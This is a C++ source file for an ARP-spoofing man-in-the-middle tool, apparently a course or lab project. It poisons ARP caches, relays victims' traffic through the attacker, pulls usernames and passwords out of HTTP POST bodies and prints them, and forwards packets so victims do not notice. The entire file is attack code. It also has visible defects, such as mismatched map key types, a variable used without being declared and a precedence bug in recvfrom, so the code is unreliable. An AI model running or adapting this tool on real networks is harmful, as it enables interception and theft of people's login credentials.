#include "mitm_attack.hpp"

// #define INFO 1

/*
Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
Change the destination MAC address of the packet to the corresponding MAC address in the map
*/
bool modifyPacket(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo& info) {
    // Get the Ethernet header
    struct ethhdr *eth = (struct ethhdr *)buffer;

    // Get the IP header
    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);

    bool modified = false;

    // Change the source MAC to my MAC
    memcpy(eth->h_source, info.src_mac.data(), ETH_ALEN);

    // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
        // Find the MAC address for the gateway IP
        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
        memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
        modified = true;
    }
    // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
        // Find the MAC address for the destination IP
        std::array<uint8_t, 4> dest_ip_addr;
        memcpy(dest_ip_addr.data(), &iph->daddr, 4);
        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
        memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
        modified = true;
    }
    return modified;
}

// Function to send the large packet
void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
    // Get the payload
    uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
    int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

    int chunk_size = 1024;  // Size of each chunk
    int total_sent = 0;     // Total amount of data sent
    while (total_sent < bytes) {
        int to_send = std::min(chunk_size, bytes - total_sent);
        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
            perror("sendto() failed (NonHttpPostPacket)");
            exit(EXIT_FAILURE);
        }
        total_sent += to_send;
    }
}

// Parse the POST HTTP packet and print the username and password
void printUsernameAndPassword(uint8_t *payload, int payload_length) {
    // Find the username and password
    char *username_start = strstr((char *)payload, "Username=");
    char *password_start = strstr((char *)payload, "Password=");
    if (username_start && password_start) {
        char *username_end = strchr(username_start, '&');
        char *password_end = (char *)payload + payload_length;

        if (!username_end) {
            username_end = password_start - 1;
        }

        // Print the username and password
        printf("\nUsername: ");
        for (char *p = username_start + strlen("Username="); p < username_end; p++) {
            printf("%c", *p);
        }
        printf("\nPassword: ");
        for (char *p = password_start + strlen("Password="); p < password_end; p++) {
            printf("%c", *p);
        }
        printf("\n");
    }
}

// Function to handle receiving responses
void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo& info) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);

    while (true) {
        int n;
        if (n = recvfrom(sockfd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len) < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {// Check if packet is an ARP packet
            parseARPReply(buffer, ip_mac_pairs, info);
            continue;
        }
        else if (n < ETH_HDRLEN + sizeof(struct iphdr)) continue; // Check if the packet is an IP packet
        else {
            struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
            if (ntohl(iph->daddr) == 0x7f000001 || ntohl(iph->saddr) == 0x7f000001) continue; // If the ip is loopback, skip
        }

        // Modify the packet's MAC address
        modifyPacket(buffer, ip_mac_pairs, info);

        // Check if packet is a TCP packet
        if (n < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
            if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) <= 0) {
                perror("sendto() failed (CHECK TCP PACKET)");
                exit(EXIT_FAILURE);
            }
            continue;  // Not enough data for TCP header
        }

        // Get the payload of the TCP packet
        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
        int payload_length = n - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

        // Check if the payload is an HTTP POST packet
        const char *http_post = "POST";

        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
            sendNonHttpPostPacket(buffer, n, sockfd, info);
            continue;
        }

        // Print the username and password
        printUsernameAndPassword(payload, payload_length);

        // Send the packet in order to prevent the victim from knowing the attack
        if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
        memset(buffer, 0, IP_MAXPACKET);
    }
}

int main(int argc, char **argv) {
    struct ifreq ifr;
    int sockfd;
    AccessInfo info;

    info.getInfo(); // get all info including interface name

#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", info.src_mac[0], info.src_mac[1], info.src_mac[2], info.src_mac[3], info.src_mac[4], info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", info.interface, info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sockfd, info);

    // Use a table to save IP-MAC pairs
    std::map<std::vector<uint8_t>, std::vector<uint8_t>> ip_mac_pairs;

    // Start the thread
    std::thread send_thread(sendSpoofedARPReply, sockfd, std::ref(ip_mac_pairs), info);

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Receive responses
    receiveHandler(sockfd, ip_mac_pairs, info);

    // Wait for the thread to finish
    send_thread.join();

    // Close socket descriptor.
    close(sockfd);

    return (EXIT_SUCCESS);
}